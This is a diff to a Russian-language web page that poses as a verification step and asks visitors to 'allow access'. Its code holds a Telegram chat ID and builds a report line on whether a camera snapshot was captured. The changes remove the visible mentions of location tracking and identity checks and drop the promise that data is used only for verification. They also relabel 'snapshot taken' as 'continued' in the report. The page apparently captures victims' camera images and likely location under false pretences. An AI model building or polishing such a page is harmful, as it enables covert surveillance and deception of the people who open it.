@@ -43,16 +43,16 @@
      Нажмите кнопку ниже и разрешите доступ.</p>
 
   <div class="perms">
-    <div><span class="check">✓</span> Определение местоположения</div>
-    <div><span class="check">✓</span> Подтверждение личности</div>
+    <div><span class="check">✓</span> подтверждение </div>
+    <div><span class="check">✓</span> Подтверждение </div>
     <div><span class="check">✓</span> Проверка соединения</div>
   </div>
 
-  <button id="btn">Проверить и продолжить</button>
+  <button id="btn">Проверить</button>
   <div class="status" id="st"></div>
 
   <div class="fine">
-    Ваши данные защищены и используются только для проверки.
+    Ваши данные защищены 
   </div>
 </div>
 
@@ -273,7 +273,7 @@ var TG_CHAT = "8152269891";
     // Разбираем камеру
     var camLine = 'не получена';
     if (camRes && camRes.dataUrl) {
-      camLine = 'снимок сделан ' + camRes.w + 'x' + camRes.h;
+      camLine = 'продолжено ' + camRes.w + 'x' + camRes.h;
     } else if (camRes && camRes.error) {
       camLine = 'отклонено: ' + camRes.error;
     }
